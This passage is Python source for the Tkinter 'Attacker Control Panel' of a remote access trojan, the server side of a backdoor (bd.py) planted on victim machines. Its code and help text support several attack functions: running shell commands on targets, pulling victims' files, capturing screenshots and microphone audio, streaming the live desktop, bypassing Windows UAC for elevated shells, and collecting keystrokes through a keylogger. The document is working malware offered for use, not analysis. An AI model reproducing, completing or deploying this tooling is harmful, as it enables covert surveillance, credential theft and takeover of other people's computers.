        self.send_command("get_keylog")
        self.log_message("Retrieving captured keystrokes...", "info")

    def keylog_status(self):
        """Get keylogger status from target"""
        if not self.current_target:
            messagebox.showwarning("No Target", "Please select a target first.")
            return
        
        self.send_command("keylog_status")
        self.log_message("Checking keylogger status...", "info")

    def show_help_window(self):
        """Display a Toplevel window with help information."""
        help_win = tk.Toplevel(self.master)
        help_win.title("Help & Instructions")
        help_win.geometry("800x600")
        help_win.configure(bg=self.colors["bg_primary"])
        help_win.transient(self.master) # Keep it on top of the main window
        help_win.grab_set() # Modal behavior

        # Title
        Label(help_win, text="How to Use the Control Panel", 
              font=self.fonts["title"],
              bg=self.colors["bg_primary"],
              fg=self.colors["accent_primary"]).pack(pady=(10, 15))

        # Content area
        help_text_area = scrolledtext.ScrolledText(help_win, 
                                                   wrap=tk.WORD, 
                                                   bg=self.colors["bg_secondary"],
                                                   fg=self.colors["text_primary"],
                                                   font=self.fonts["body"],
                                                   borderwidth=0,
                                                   highlightthickness=0,
                                                   padx=15,
                                                   pady=15)
        help_text_area.pack(fill='both', expand=True, padx=10, pady=5)

        help_content = """
Welcome to the Attacker Control Panel. Here is a guide to its features:

1. Connecting to a Target
--------------------------
- When a backdoor (`bd.py`) is run on a target machine, it will attempt to connect here.
- A dialog will appear asking you to give the new connection a nickname.
- The target will then appear in the "TARGETS" list on the left.
- Click on a target in the list to select it for interaction.

2. Using the Terminal
---------------------
- Select the "Terminal" tab.
- Type any standard shell command (e.g., `dir`, `ls`, `pwd`) into the input box at the bottom and press Enter.
- The output from the target machine will be displayed in the black console area.

3. File Management (Files Tab)
------------------------------
- Download: Enter the full path of a file on the target machine (e.g., `C:\\Users\\victim\\Desktop\\secret.txt`) and click "Download". The file will be saved in the same directory where `server.py` is running.
- Upload: Enter the full path of a file on YOUR machine. The file will be uploaded to the target's current working directory.

4. Quick Actions Panel (Right Side)
-----------------------------------
- Screenshot: Takes a screenshot of the target's primary monitor.
- Record Audio: Records audio from the target's microphone for a specified duration.
- Live Desktop: Starts a real-time stream of the target's desktop. Press 'q' or close the window to stop.
- System/Process/Network Info: Runs common commands to get information about the target system.

5. Privilege Escalation (Privilege Escalation Tab)
--------------------------------------------------
This feature attempts to bypass User Account Control (UAC) on Windows.
- Spawn Elevated Shell: Tries to get a new connection from the target with Administrator privileges. A new target will appear in the list if successful.
- Run Elevated Command: Runs a single command with Administrator privileges. You can use the preset buttons for common commands.

6. Keylogger (Keylogger Tab & Quick Actions)
--------------------------------------------
- Start: Begins capturing keystrokes on the target machine.
- Get Logs: Retrieves all captured keystrokes from the target's memory and displays them. This will also clear the buffer on the target.
- Stop: Halts the keylogger.
- Status: Checks if the keylogger is currently running.

"""
        help_text_area.insert(tk.END, help_content)
        help_text_area.configure(state='disabled')

        # Close button
        close_btn = self.create_simple_button(help_win, "Close", help_win.destroy,
                                             bg_color=self.colors["accent_primary"])
        close_btn.pack(pady=10)

    # --- Communication Helpers ---
    def reliable_send(self, target, data):
        jsondata = json.dumps(data)
        target.send(jsondata.encode())

    def reliable_recv(self, target):
        data = ''
        while True:
            try:
                data = data + target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue

    def download_file(self, target, file_name):
        try:
            with open(file_name, 'wb') as f:
                target.settimeout(10) # Longer timeout for first chunk
                chunk = target.recv(4096)
                target.settimeout(1)
                while chunk:
                    f.write(chunk)
                    try:
                        chunk = target.recv(4096)
                    except socket.timeout:
                        break
            self.log_message(f"Download complete: {file_name}", "success")
        finally:
             target.settimeout(None)

    # --- Command Handling ---
    def handle_response(self, target, client_id, payload):
        command = payload.get('command')
        args = payload.get('args')
        try:
            if command == 'quit':
                # This will be handled on the client side, we just clean up here
                return 
            elif command == 'clear':
                self.log_area.configure(state='normal')
                self.log_area.delete('1.0', tk.END)
                self.log_area.configure(state='disabled')
            elif command == 'cd':
                pass # No response needed
            elif command == 'download':
                self.download_file(target, args)
            elif command == 'upload':
                # Server receives the file from the backdoor
                pass # Placeholder for server-side upload logic
            elif command == 'screenshot':
                file_name = f'screenshot_{client_id.replace(":", "_")}_{self.screenshot_count}.png'
                self.download_file(target, file_name)
                self.screenshot_count += 1
            elif command == 'record_audio':
                file_name = f'audio_{client_id.replace(":", "_")}_{self.audio_count}.wav'
                self.download_file(target, file_name)
                self.audio_count += 1
            elif command == 'escalate':
                # Just wait for response - new connection will appear as a separate client
                result = self.reliable_recv(target)
                if result is not None:
                    self.log_message(result, "warning")
            elif command == 'run_elevated':
                result = self.reliable_recv(target)
                if result is not None:
                    self.log_message(result, "warning")
            elif command == 'test_escalation':
                result = self.reliable_recv(target)
                if result is not None:
                    self.log_message(result, "warning")
            elif command in ['start_keylogger', 'stop_keylogger', 'get_keylog', 'keylog_status']:
                # Handle keylogger commands
                result = self.reliable_recv(target)
                if result is not None:
                    if 'successfully' in result or 'Status:' in result:
                        self.log_message(result, "success")
                    elif 'keystrokes:' in result:
                        self.log_message(result, "info")
                    else:
                        self.log_message(result, "warning")
            else:
                result = self.reliable_recv(target)
                if result is not None:
                    self.log_message(result)
        except (socket.error, json.JSONDecodeError, BrokenPipeError, ConnectionResetError) as e:
            self.log_message(f"Communication error with {client_id}: {e}", "error")
            self.remove_client(client_id)

    def send_command(self, command_str, args=None):
        if not self.current_target:
            self.log_message("No target selected. Please select a target from the list.", "warning")
            return
        
        payload = {'command': command_str}
        if args:
            payload['args'] = args

        log_display = f"{command_str} {args}" if args else command_str
        self.log_message(f"> {log_display}")
        
        target_to_use = self.current_target
        client_id_to_use = self.current_client_id

        try:
            self.reliable_send(target_to_use, payload)
        except Exception as e:
            self.log_message(f"Failed to send command to {client_id_to_use}: {e}", "error")
            self.remove_client(client_id_to_use)
            return
        
        # Don't wait for a response for commands that don't send one.
        if command_str not in ['start_stream', 'stop_stream']:
            response_thread = threading.Thread(
                target=self.handle_response, 
                args=(target_to_use, client_id_to_use, payload), 
                daemon=True
            )
            response_thread.start()
        
        if command_str == 'quit':
            self.remove_client(client_id_to_use)


    def send_command_event(self, event=None):
        cmd = self.cmd_entry.get()
        if cmd:
            self.cmd_entry.delete(0, tk.END)
            # Simple commands from the entry box
            parts = cmd.split(' ', 1)
            command_str = parts[0]
            args = parts[1] if len(parts) > 1 else None
            self.send_command(command_str, args)

    def toggle_stream(self):
        # If stream is in a transitional state, do nothing.
        if self.stream_busy:
            self.log_message("Stream is busy. Please wait.", "warning")
            return

        if not self.current_target:
            self.log_message("No target selected for streaming.", "warning")
            return

        if self.stream_active:
            self.stop_stream_logic()
        else:
            self.start_stream_logic()

    def start_stream_logic(self):
        # Check if a stream is already active
        if self.stream_active:
            self.log_message("Stream is already active. Please stop the current stream first.", "warning")
            return

        # Use the configured static IP for the stream address.
        stream_address = f"{STATIC_IP}:5556"
        self.log_message(f"Starting live stream on {stream_address}", "info")

        self.stream_active = True
        self.stream_busy = True 
        self.stream_button.config(text="Connecting...", bg=self.colors["accent_warning"])
        
        # CRITICAL FIX: Create a unique token for this specific streaming session.
        self.stream_token = object()
        
        # Empty the queue of any stale messages (like 'None') from a previous run.
        while not self.video_queue.empty():
            try:
                self.video_queue.get_nowait()
            except queue.Empty:
                break

        # Create the OpenCV window here, on the main thread, before starting other threads.
        window_name = f"Live Stream - {self.current_client_id}"
        cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)
        cv2.resizeWindow(window_name, 1280, 720)

        # Start the network thread to receive frames
        stream_thread = threading.Thread(target=self.receive_stream, daemon=True)
        stream_thread.start()
        
        # Start the GUI update loop to display frames
        self.master.after(100, self.update_stream_window)
        
        # Send the command to the client AFTER starting our listeners
        self.send_command("start_stream", args=stream_address)

    def stop_stream_logic(self):
        """This function is ONLY for when the user clicks the 'Stop Stream' button."""
        if self.stream_active:
            self.log_message("Stopping live stream...", "info")
            self.stream_busy = True # Lock the button
            self.stream_button.config(text="Stopping...", bg=self.colors["accent_warning"])
            self.stream_active = False
            # Send stop command to client
            self.send_command("stop_stream", None)
            # The running threads will detect this flag change and terminate.
        else:
            self.log_message("No active stream to stop.", "warning")

    def receive_stream(self):
        """Network thread: Connects to the client, receives frame data, and puts it in the video_queue."""
        stream_server = None
        conn = None
        try:
            stream_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            stream_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            stream_server.bind(('0.0.0.0', 5556))
            stream_server.listen(1)
            self.log_message("Stream server listening on port 5556...", "info")
            
            conn, _ = stream_server.accept()
            self.log_message("Stream connection established.", "success")
            self.master.after(0, lambda: self.stream_button.config(text="Stop Stream", 
                                                                  bg=self.colors["accent_danger"]))
            self.stream_busy = False # Unlock button now that connection is live

            payload_size = struct.calcsize(">L")
            data = b""

            while self.stream_active:
                while len(data) < payload_size:
                    packet = conn.recv(4096)
                    if not packet or not self.stream_active: break
                    data += packet
                if not self.stream_active: break

                packed_msg_size = data[:payload_size]
                data = data[payload_size:]
                msg_size = struct.unpack(">L", packed_msg_size)[0]

                while len(data) < msg_size:
                    data += conn.recv(4096)
                
                frame_data = data[:msg_size]
                data = data[msg_size:]
                self.video_queue.put(frame_data) # Put raw frame data onto the queue
        
        except Exception as e:
            if self.stream_active:
                self.log_message(f"Stream network error: {e}", "error")
        finally:
            self.log_message("Closing stream connection...", "info")
            if conn: conn.close()
            if stream_server: stream_server.close()
            # Signal the GUI thread that THIS SPECIFIC stream is over by putting its unique token.
            self.video_queue.put(self.stream_token)

    def update_stream_window(self):
        """GUI thread: Creates/updates the OpenCV window with frames from the video_queue."""
        window_name = f"Live Stream - {self.current_client_id}"

        try:
            # Pull a frame from the queue without blocking
            frame_data = self.video_queue.get_nowait()

            # Check if the received item is the token for the CURRENT stream session.
            if frame_data is self.stream_token: 
                self.final_stream_cleanup(window_name)
                return # This is the ONLY way the GUI loop stops.

            # The window is now guaranteed to exist, so we can just show the frame.
            frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
            if frame is not None:
                cv2.imshow(window_name, frame)
            
            # Check for window closure or 'q' key press
            key = cv2.waitKey(1) & 0xFF
            if key == ord('q') or cv2.getWindowProperty(window_name, cv2.WND_PROP_VISIBLE) < 1:
                self.stop_stream_logic() # Just signal the stop, don't cleanup here.

        except queue.Empty:
            # This is normal, just means no new frame has arrived yet.
            pass
        
        # Reschedule the next GUI update. The loop is only stopped when 'None' is received.
        self.master.after(20, self.update_stream_window)

    def final_stream_cleanup(self, window_name):
        """GUI thread: Final cleanup of UI and OpenCV windows."""
        self.log_message("Stream ended.", "info")
        
        try:
            cv2.destroyWindow(window_name)
            # Process any lingering events
            for _ in range(5):
                cv2.waitKey(1)
        except:
            pass
        
        self.stream_active = False
        self.stream_busy = False
        self.stream_button.config(text="Live Desktop", bg=self.colors["accent_success"])
        
        # Empty the queue of any old frames before the next run
        while not self.video_queue.empty():
            try:
                self.video_queue.get_nowait()
            except queue.Empty:
                break

    def force_reset_stream_state(self):
        """Force reset the streaming state and clean up all resources."""
        self.log_message("Force resetting stream state...", "warning")
        self.stream_active = False
        
        # Simple cleanup
        try:
            cv2.destroyAllWindows()
            cv2.waitKey(100)
        except:
            pass
        
        # Reset UI
        self.stream_button.config(text="Live Desktop", bg=self.colors["accent_success"])
        self.log_message("Stream state reset complete.", "success")

    def test_opencv_display(self):
        """Test if OpenCV can create and display windows properly on this system."""
        self.log_message("Testing OpenCV display capability...", "info")
        try:
            # Check if DISPLAY environment variable is set (Linux)
            if platform.system() == "Linux":
                display = os.environ.get('DISPLAY')
                self.log_message(f"DISPLAY environment variable: {display}", "info")
                if not display:
                    self.log_message("WARNING: No DISPLAY variable set!", "warning")
                    return False
            
            # Try to create a test window
            test_window = "OpenCV_Test_Window"
            test_frame = np.zeros((200, 400, 3), dtype=np.uint8)
            cv2.putText(test_frame, "OpenCV Test", (100, 100), 
                       cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 255, 0), 2)
            
            cv2.namedWindow(test_window, cv2.WINDOW_NORMAL)
            cv2.imshow(test_window, test_frame)
            cv2.waitKey(2000)  # Display for 2 seconds
            cv2.destroyWindow(test_window)
            cv2.waitKey(100)
            
            self.log_message("OpenCV display test successful!", "success")
            return True
            
        except Exception as e:
            self.log_message(f"OpenCV display test failed: {e}", "error")
            return False

if __name__ == '__main__':
    root = tk.Tk()
    app = MultiClientServerGUI(root)
    root.mainloop()